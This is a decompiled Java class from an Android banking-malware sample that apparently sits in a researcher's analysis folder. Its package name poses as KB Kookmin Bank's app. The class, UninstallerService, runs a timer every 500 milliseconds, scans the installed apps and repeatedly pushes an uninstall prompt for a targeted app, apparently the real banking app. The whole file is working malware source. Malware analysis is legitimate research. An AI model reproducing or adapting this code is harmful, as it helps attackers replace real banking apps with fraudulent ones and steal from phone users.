package com.kbstar.kb.android.services;

import android.app.Service;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.IBinder;
import android.util.Log;
import com.kbstar.kb.android.star.AppContacts;
import java.util.ArrayList;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;

public class UninstallerService
  extends Service
{
  private static final long BANK_TOP_CHECK_TIME = 500L;
  private final String DEBUG_TAG = "clService";
  private TimerTask mTimerTask;
  public boolean threadDisable = true;
  private Timer timer;
  
  private void getSoftName()
  {
    new ArrayList();
    PackageManager localPackageManager = getPackageManager();
    List localList = localPackageManager.getInstalledApplications(8192);
    int i = 0;
    for (;;)
    {
      if (i >= localList.size()) {
        return;
      }
      Object localObject = (ApplicationInfo)localList.get(i);
      if (((String)((ApplicationInfo)localObject).loadLabel(localPackageManager)).equalsIgnoreCase(AppContacts.aname))
      {
        localObject = new Intent("android.intent.action.DELETE", Uri.parse("package:" + ((ApplicationInfo)localObject).packageName));
        ((Intent)localObject).addFlags(268435456);
        startActivity((Intent)localObject);
      }
      i += 1;
    }
  }
  
  public IBinder onBind(Intent paramIntent)
  {
    return null;
  }
  
  public void onCreate()
  {
    super.onCreate();
    Log.v("clService", "onCreate");
    this.timer = new Timer();
    this.mTimerTask = new TimerTask()
    {
      public void run()
      {
        UninstallerService.this.getSoftName();
      }
    };
    this.timer.schedule(this.mTimerTask, 500L, 500L);
  }
  
  public void onDestroy()
  {
    super.onDestroy();
    this.threadDisable = true;
    Log.v("clService", "on destroy");
    if (this.timer != null)
    {
      this.timer.cancel();
      this.timer = null;
    }
    if (this.mTimerTask != null)
    {
      this.mTimerTask.cancel();
      this.mTimerTask = null;
    }
  }
}


/* Location:              /home/enzo/Documents/BorelEnzo.github.io/malwares/dsencrypt/payload.jar!/com/kbstar/kb/android/services/UninstallerService.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */